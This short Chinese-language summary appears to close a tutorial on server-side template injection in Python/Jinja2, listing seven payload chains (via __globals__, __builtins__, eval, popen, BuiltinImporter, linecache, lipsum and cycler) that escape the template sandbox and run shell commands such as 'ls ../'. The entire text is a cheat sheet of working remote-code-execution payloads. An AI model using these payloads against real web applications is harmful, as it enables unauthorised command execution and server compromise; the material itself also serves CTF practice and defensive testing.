小结

  • eval函数的核心用法是：X[num].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls ../').read()")
  • popen函数的核心用法是：X[num].__init__.__globals__['popen']('ls ../').read()
  • os模板核心用法是：X[num].__init__.__globals__['os'].popen('ls ../').read()
  • BuiltinImporter核心用法是：X[num]["load_module"]("os")["popen"]("ls ../").read()
  • linecache核心用法是：X[num].__init__.__globals__['linecache']['os'].popen('ls ../').read()
  • lipsum核心用法是：{{lipsum.__globals__['os'].popen('ls ../').read()}}
  • cycler核心用法是：{{cycler.__init__.__globals__['os'].popen('ls ../').read()}}
